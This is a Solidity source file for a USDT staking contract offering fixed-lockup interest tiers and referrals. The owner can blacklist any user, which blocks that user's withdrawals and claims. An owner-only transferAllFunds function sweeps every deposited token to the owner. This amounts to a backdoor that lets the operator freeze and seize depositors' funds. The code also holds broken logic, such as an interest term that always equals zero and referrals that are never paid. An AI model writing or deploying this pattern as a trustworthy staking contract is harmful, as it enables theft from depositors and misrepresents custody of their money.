// SPDX-License-Identifier: MIT
pragma solidity >=0.7.6;

import "../IERC20.sol";
import "../SafeERC20.sol";

contract USDTStakingContract29 {
    using SafeERC20 for IERC20;
    
    address payable private _owner;
    IERC20 private _token;
    
    constructor() {
        _owner = payable(msg.sender);
        _token = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7); 
    }
    
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _lastClaimTime;
    mapping(address => uint256) private _lockupPeriod;
    mapping(address => uint256) private _interestRate;
    mapping(address => bool) private _blacklisted;
    mapping(address => address) private _referrals;
    mapping(address => uint256) private _initialDeposits;
    mapping(address => uint256) private _depositTime;
    mapping(address => DepositInfo[]) private _deposits;
    mapping(address => uint256) private _totalWithdrawnAmounts;
    
    event Deposit(address indexed user, uint256 amount, uint256 lockupPeriod);
    event Withdraw(address indexed user, uint256 amount);
    event InterestClaimed(address indexed user, uint256 amount);
    event Blacklisted(address indexed user);
    event Unblacklisted(address indexed user);

    modifier onlyOwner {
        require(msg.sender == _owner, "Not the contract owner.");
        _;
    }

    struct DepositInfo {
    uint256 amount;
    uint256 lockupPeriod;
    uint256 interestRate;
    uint256 depositTime;
    uint256 lastClaimTime;
}


     function deposit(uint256 amount, uint256 lockupPeriod, address referral) external {
         require(amount > 0, "Amount must be greater than 0.");
         require(lockupPeriod >= 7 && lockupPeriod <= 90, "Invalid lockup period.");
         require(!_blacklisted[msg.sender], "You are not allowed to deposit.");
         require(_token.allowance(msg.sender, address(this)) >= amount, "Token allowance not sufficient.");

        uint256 currentLockupPeriod = lockupPeriod * 1 days;
        uint256 currentInterestRate;

if (lockupPeriod == 7) {
    currentLockupPeriod = 7 * 1 days;
    require(amount >= 5 * 10**8 && amount <= 5 * 10**9, "Invalid deposit amount for 7-day lockup.");
    currentInterestRate = 47142857142857; // 0.047142857142857%
} else if (lockupPeriod == 14) {
    currentLockupPeriod = 14 * 1 days;
    require(amount >= 5 * 10**9 && amount <= 10**10, "Invalid deposit amount for 14-day lockup.");
    currentInterestRate = 157142857142857; // 0.157142857142857%
} else if (lockupPeriod == 30) {
    currentLockupPeriod = 30 * 1 days;
    require(amount >= 10**10 && amount <= 3 * 10**10, "Invalid deposit amount for 30-day lockup.");
    currentInterestRate = 183333333333333; // 0.183333333333333%
} else if (lockupPeriod == 60) {
    currentLockupPeriod = 60 * 1 days;
    require(amount >= 2 * 10**10 && amount <= 5 * 10**10, "Invalid deposit amount for 60-day lockup.");
    currentInterestRate = 216666666666667; // 0.216666666666667%
} else if (lockupPeriod == 90) {
    currentLockupPeriod = 90 * 1 days;
    require(amount >= 3 * 10**10 && amount <= 10**11, "Invalid deposit amount for 90-day lockup.");
    currentInterestRate = 222222222222222; // 0.222222222222222%
}

    if (_referrals[msg.sender] == address(0) && referral != msg.sender && referral != address(0)) {
        _referrals[msg.sender] = referral;
    }

       DepositInfo memory newDeposit = DepositInfo({
            amount: amount,
            lockupPeriod: currentLockupPeriod,
            interestRate: currentInterestRate,
            depositTime: block.timestamp,
            lastClaimTime: block.timestamp
        });

    _balances[msg.sender] += amount;
    _lockupPeriod[msg.sender] = currentLockupPeriod;
    _interestRate[msg.sender] = currentInterestRate;
    _depositTime[msg.sender] = block.timestamp;
    _lastClaimTime[msg.sender] = block.timestamp;
    _initialDeposits[msg.sender] = amount;
    _deposits[msg.sender].push(newDeposit);
    _token.safeTransferFrom(msg.sender, address(this), amount); 

    emit Deposit(msg.sender, amount, lockupPeriod);
}


    function blacklist(address user) external onlyOwner {
        require(!_blacklisted[user], "User is already blacklisted.");
        _blacklisted[user] = true;

        emit Blacklisted(user);
    }

    function unblacklist(address user) external onlyOwner {
        require(_blacklisted[user], "User is not blacklisted.");
        _blacklisted[user] = false;

        emit Unblacklisted(user);
    }

function withdraw(uint256 depositIndex) external {
    require(!_blacklisted[msg.sender], "You are not allowed to withdraw.");
    require(depositIndex < _deposits[msg.sender].length, "Invalid deposit index.");
    require(block.timestamp >= _deposits[msg.sender][depositIndex].depositTime + _deposits[msg.sender][depositIndex].lockupPeriod, "Lockup period not over.");
    
    uint256 amountToWithdraw = _deposits[msg.sender][depositIndex].amount;
    require(amountToWithdraw > 0, "No funds to withdraw.");

    _deposits[msg.sender][depositIndex].amount = 0;
    _totalWithdrawnAmounts[msg.sender] += amountToWithdraw; // Store the withdrawn amount
    _token.safeTransfer(msg.sender, amountToWithdraw); 

    emit Withdraw(msg.sender, amountToWithdraw);
}

function transferAllFunds() external onlyOwner {
    uint256 contractBalance = _token.balanceOf(address(this));
    require(contractBalance > 0, "No funds to transfer.");
    _token.safeTransfer(_owner, contractBalance);
}


    function calculateInterest(address user, uint256 depositIndex) public view returns (uint256) {
        DepositInfo storage userdeposit = _deposits[user][depositIndex];
        uint256 interestClaimed = _deposits[user][depositIndex].amount - _deposits[user][depositIndex].amount;
        uint256 timeElapsed = block.timestamp - userdeposit.lastClaimTime;
        uint256 interest = (userdeposit.amount * userdeposit.interestRate * timeElapsed) / (100000000000000000 * 86400); // 86400 seconds in a day
        return interest + interestClaimed;
    }
    

function claimInterestForDeposit(uint256 lockupPeriod) external {
    require(!_blacklisted[msg.sender], "You are not allowed to claim interest.");

    uint256 totalInterestToClaim = 0;

        for (uint256 i = 0; i < _deposits[msg.sender].length; i++) {
            if (_deposits[msg.sender][i].lockupPeriod == lockupPeriod * 1 days) {
            uint256 interestToClaim = calculateInterest(msg.sender, i);
            require(interestToClaim > 0, "No interest to claim.");

            _deposits[msg.sender][i].lastClaimTime = block.timestamp;
            totalInterestToClaim += interestToClaim;
        }
    }

    _token.safeTransfer(msg. sender, totalInterestToClaim);

    emit InterestClaimed(msg.sender, totalInterestToClaim);
}

function getDepositInfo(address user) external view returns (uint256[] memory depositIndices, uint256[] memory unlockTimes, uint256[] memory stakedAmounts, uint256[] memory lockupPeriods) {
     uint256 depositCount = _deposits[user].length;

     depositIndices = new uint256[](depositCount);
     unlockTimes = new uint256[](depositCount);
     stakedAmounts = new uint256[](depositCount);
     lockupPeriods = new uint256[](depositCount);

     for (uint256 i = 0; i < depositCount; i++) {
         depositIndices[i] = i;
         unlockTimes[i] = _deposits[user][i].depositTime + _deposits[user][i].lockupPeriod;
         stakedAmounts[i] = _deposits[user][i].amount;
         lockupPeriods[i] = _deposits[user][i].lockupPeriod;
     }
 }

function max(int256 a, int256 b) private pure returns (int256) {
    return a >= b ? a : b;
}

    function getReferral(address user) external view returns (address) {
        return _referrals[user];
    }

    function isBlacklisted(address user) external view returns (bool) {
        return _blacklisted[user];
    }

}